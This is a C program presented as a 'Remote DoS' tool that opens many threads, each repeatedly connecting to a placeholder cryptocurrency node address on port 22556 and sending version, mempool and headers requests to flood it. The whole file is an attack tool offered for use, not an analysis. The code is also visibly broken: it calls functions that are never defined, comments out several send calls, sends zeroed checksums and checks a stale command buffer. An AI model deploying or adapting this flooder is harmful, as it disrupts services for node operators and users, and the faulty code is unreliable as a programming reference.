Remote DoS Made By Pad and SleepTheGod

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

#define MAGIC 0xC0C0C0C0
#define NODE_NETWORK 1
#define NODE_WITNESS 8

void create_version_payload(unsigned char* payload) {
    unsigned int version = 99999;
    unsigned long long services = NODE_NETWORK;
    unsigned int timestamp = (unsigned int)time(NULL);
    unsigned char addr_fill[16] = {0};  // Filling with zeros
    unsigned long long nonce = 0;
    char user_agent[] = "/Sleep and Pad/";
    unsigned char user_agent_length = strlen(user_agent);

    // Convert user_agent_length to compact size format
    unsigned char user_agent_length_compact = user_agent_length;
    
    unsigned int start_height = 0;
    unsigned char relay = 1;

    memcpy(payload, &version, sizeof(unsigned int));
    memcpy(payload + sizeof(unsigned int), &services, sizeof(unsigned long long));
    memcpy(payload + sizeof(unsigned int) + sizeof(unsigned long long), &timestamp, sizeof(unsigned int));
    memcpy(payload + sizeof(unsigned int) + sizeof(unsigned long long) + sizeof(unsigned int), addr_fill, sizeof(addr_fill));
    memcpy(payload + sizeof(unsigned int) + sizeof(unsigned long long) + sizeof(unsigned int) + sizeof(addr_fill), addr_fill, sizeof(addr_fill));
    memcpy(payload + sizeof(unsigned int) + sizeof(unsigned long long) + sizeof(unsigned int) + sizeof(addr_fill) + sizeof(addr_fill), &nonce, sizeof(unsigned long long));
    memcpy(payload + sizeof(unsigned int) + sizeof(unsigned long long) + sizeof(unsigned int) + sizeof(addr_fill) + sizeof(addr_fill) + sizeof(unsigned long long), &user_agent_length_compact, sizeof(unsigned char));
    memcpy(payload + sizeof(unsigned int) + sizeof(unsigned long long) + sizeof(unsigned int) + sizeof(addr_fill) + sizeof(addr_fill) + sizeof(unsigned long long) + sizeof(unsigned char), user_agent, user_agent_length);
    memcpy(payload + sizeof(unsigned int) + sizeof(unsigned long long) + sizeof(unsigned int) + sizeof(addr_fill) + sizeof(addr_fill) + sizeof(unsigned long long) + sizeof(unsigned char) + user_agent_length, &start_height, sizeof(unsigned int));
    memcpy(payload + sizeof(unsigned int) + sizeof(unsigned long long) + sizeof(unsigned int) + sizeof(addr_fill) + sizeof(addr_fill) + sizeof(unsigned long long) + sizeof(unsigned char) + user_agent_length + sizeof(unsigned int), &relay, sizeof(unsigned char));
}

void process_inv(unsigned char* payload) {
    unsigned char* p = payload;
    unsigned char count = *p;

    if (count == 0xFD) {
        p++;
        count = *((unsigned short*)p);
        p += 2;
    } else {
        p++;
    }

    for (int i = 0; i < count; i++) {
        unsigned int inv_type = *((unsigned int*)p);
        p += 4;
        
        unsigned char inv_hash[32];
        memcpy(inv_hash, p, sizeof(inv_hash));
        p += sizeof(inv_hash);

        if (inv_type == 1) {
            printf("Received transaction: %.*s\n", 64, inv_hash);
        }
    }
}

void process_message(unsigned char* payload, int thread_num, int* verack_sent, int* verack_received) {
    unsigned int magic = *((unsigned int*)payload);

    if (magic != MAGIC) {
        printf("Invalid magic number\n");
        return;
    }

    char command[12];
    memcpy(command, payload + 4, 12);

    unsigned int payload_length = *((unsigned int*)(payload + 16));
    unsigned char* payload_data = payload + 24;

    if (strcmp(command, "version") == 0) {
        *verack_sent = 1;
    } else if (strcmp(command, "verack") == 0) {
        *verack_received = 1;
        send_verack();
    } else if (strcmp(command, "inv") == 0) {
        printf("Thread %d: Received inv payload: %.*s\n", thread_num, 40, payload_data);
        process_inv(payload_data);
    } else if (strcmp(command, "ping") == 0) {
        process_ping(payload_data);
    } else if (strcmp(command, "headers") == 0) {
        printf("Received headers: %.*s\n", payload_length * 2, payload_data);
    } else if (strcmp(command, "tx") == 0) {
        printf("Received transaction: %.*s\n", payload_length * 2, payload_data);
    } else if (strcmp(command, "mempool") == 0) {
        printf("Received mempool response: %.*s, Size: %.2f MB\n", payload_length * 2, payload_data, (float)payload_length / (1024 * 1024));
        process_inv(payload_data);
    }
}

void send_verack() {
    unsigned char verack_message[24];
    unsigned int magic = MAGIC;
    char command[12] = "verack";
    unsigned int payload_length = 0;
    unsigned int checksum = 0;

    memcpy(verack_message, &magic, sizeof(unsigned int));
    memcpy(verack_message + sizeof(unsigned int), command, 12);
    memcpy(verack_message + sizeof(unsigned int) + 12, &payload_length, sizeof(unsigned int));
    memcpy(verack_message + sizeof(unsigned int) + 12 + sizeof(unsigned int), &checksum, sizeof(unsigned int));

    // Send verack_message over the socket
    // send(sock, verack_message, sizeof(verack_message), 0);
}

void request_mempool(int verack_received) {
    if (verack_received) {
        unsigned char mempool_message[24];
        unsigned int magic = MAGIC;
        char command[12] = "mempool";
        unsigned int payload_length = 0;
        unsigned int checksum = 0;

        memcpy(mempool_message, &magic, sizeof(unsigned int));
        memcpy(mempool_message + sizeof(unsigned int), command, 12);
        memcpy(mempool_message + sizeof(unsigned int) + 12, &payload_length, sizeof(unsigned int));
        memcpy(mempool_message + sizeof(unsigned int) + 12 + sizeof(unsigned int), &checksum, sizeof(unsigned int));

        // Send mempool_message over the socket
        // send(sock, mempool_message, sizeof(mempool_message), 0);
    }
}

void* handshake(void* thread_num) {
    int* thread_num_ptr = (int*)thread_num;
    int thread_num_val = *thread_num_ptr;
    
    char ip[] = "node-ip-here";
    int port = 22556;

    while (1) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);

        if (sock < 0) {
            perror("Error creating socket");
            exit(EXIT_FAILURE);
        }

        struct sockaddr_in server_address;
        server_address.sin_family = AF_INET;
        server_address.sin_port = htons(port);
        server_address.sin_addr.s_addr = inet_addr(ip);

        if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
            perror("Error connecting to node");
            close(sock);
            sleep(2);  // Sleep before reconnecting
            continue;
        }

        printf("Thread %d: Connected\n", thread_num_val);

        unsigned char version_payload[148];
        create_version_payload(version_payload);

        unsigned char version_message[180];
        unsigned int magic = MAGIC;
        char command[12] = "version";
        unsigned int payload_length = sizeof(version_payload);
        unsigned int checksum = 0;

        memcpy(version_message, &magic, sizeof(unsigned int));
        memcpy(version_message + sizeof(unsigned int), command, 12);
        memcpy(version_message + sizeof(unsigned int) + 12, &payload_length, sizeof(unsigned int));
        memcpy(version_message + sizeof(unsigned int) + 12 + sizeof(unsigned int), &checksum, sizeof(unsigned int));
        memcpy(version_message + sizeof(unsigned int) + 12 + sizeof(unsigned int) + sizeof(unsigned int), version_payload, sizeof(version_payload));

        // Send version_message over the socket
        send(sock, version_message, sizeof(version_message), 0);

        printf("Thread %d: Sent version message\n", thread_num_val);

        int verack_sent = 0;
        int verack_received = 0;

        while (1) {
            unsigned char message[65536];
            ssize_t bytes_received = recv(sock, message, sizeof(message), 0);

            if (bytes_received <= 0) {
                printf("Thread %d: Connection closed by peer\n", thread_num_val);
                close(sock);
                break;
            }

            process_message(message, thread_num_val, &verack_sent, &verack_received);

            if (strcmp(command, "version") == 0 && !verack_sent) {
                verack_sent = 1;
            }

            if (strcmp(command, "verack") == 0) {
                request_mempool(verack_received);
            }

            if (verack_received) {
                request_headers(sock);
            }
        }
    }
}

void start(int num_threads) {
    pthread_t threads[num_threads];

    for (int i = 0; i < num_threads; i++) {
        int* thread_num = malloc(sizeof(int));
        *thread_num = i + 1;
        pthread_create(&threads[i], NULL, handshake, (void*)thread_num);
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
}

int main() {
    int num_threads;

    printf("Enter the number of concurrent threads: ");
    scanf("%d", &num_threads);

    start(num_threads);

    return 0;
}
